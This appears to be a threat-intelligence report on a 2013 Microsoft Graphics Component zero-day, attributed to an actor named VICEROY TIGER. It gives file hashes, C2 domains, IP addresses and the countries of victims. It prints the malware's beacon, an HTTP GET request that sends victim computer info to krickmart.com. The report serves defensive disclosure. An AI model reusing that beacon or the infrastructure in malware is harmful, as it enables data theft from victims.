On November 5, 2013, Microsoft announced that a vulnerability in the Microsoft Graphics
Component could allow Remote Code Execution (RCE). This announcement attracted
immediate interest from the security community; McAfee posted a blog detailing the sample
that was related to the exploit activity. After analyzing several of the samples leveraging this
new vulnerability, the CrowdStrike Intelligence Team has attributed several of the malicious
documents to the India-nexus adversary we have designated VICEROY TIGER. This is the
first use of a zero-day vulnerability that has been associated with the VICEROY TIGER
actor and may represent a new Tactic, Technique, and Procedure (TTP) that this actor may
adopt moving forward. As this is the first fielded zero-day associated with this actor, it is
also possible the adversary purchased the exploit from an underground market.
The exploit leverages a vulnerability in the Microsoft graphics component and uses a large
number of ActiveX files to conduct a heap spray. A number of related files have been
identified including: 97bcb5031d28f55f20e6f3637270751d,
7671b6d1c73145bcc9de472d75b493e3, 88bf0a33451b257cadaab360629df745, and
b44359628d7b03b68b41b14536314083.

Three of the files identified above contain only the exploit code; however,
97bcb5031d28f55f20e6f3637270751d was found to be fully weaponized with malware
making a connection to krickmart.com via the following GET request:
GET /logitech/rt.php?cn=[victim computer info] HTTP/1.1
User-Agent: WinInetGet/0.1
Host: krickmart.com
Connection: Keep-Alive
Cache-Control: no-cache
The structure of this GET request, specifically the User-Agent, is consistent with previous
reporting on VICEROY TIGER malware. It appears that this C2 domain represents one
stage of a multi-stage attack structure, and CrowdStrike is looking into possibly related
malware and command infrastructure. Additional related C2 infrastructure includes:
myflatnet[.]com, 37.0.125.77, 37.0.124.106, maptonote[.]com, appworldstores[.]com, and
lampur[.]com.
Victims observed thus far are from the following countries: Pakistan, India, Saudi Arabia,
and Russia.
